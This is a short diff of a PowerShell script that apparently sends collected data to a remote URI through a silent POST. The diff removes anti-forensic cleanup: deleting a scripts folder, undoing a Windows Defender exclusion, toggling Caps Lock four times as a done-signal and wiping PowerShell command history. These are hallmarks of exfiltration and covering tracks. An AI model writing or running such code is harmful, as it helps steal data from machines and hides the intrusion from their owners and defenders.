@@ -79,22 +79,4 @@ try {
     $client.PostAsync($uri, $content).Wait()
 } catch {}
 
-# Cleanup
-$fileStream.Close()
-$fileStream.Dispose()
-
-Set-Location C:\Users\Public\Documents
-Remove-Item -Recurse -Force scripts
-Remove-MpPreference -ExclusionPath "C:\Users\Public\Documents\scripts" -Force
-
-# Caps Lock signal
-$keyBoardObject = New-Object -ComObject WScript.Shell
-for ($i=0; $i -lt 4; $i++) {
-    $keyBoardObject.SendKeys("{CAPSLOCK}")
-    Start-Sleep -Seconds 1
-}
-
-# Clear command history
-Clear-Content (Get-PSReadlineOption).HistorySavePath
-
 exit
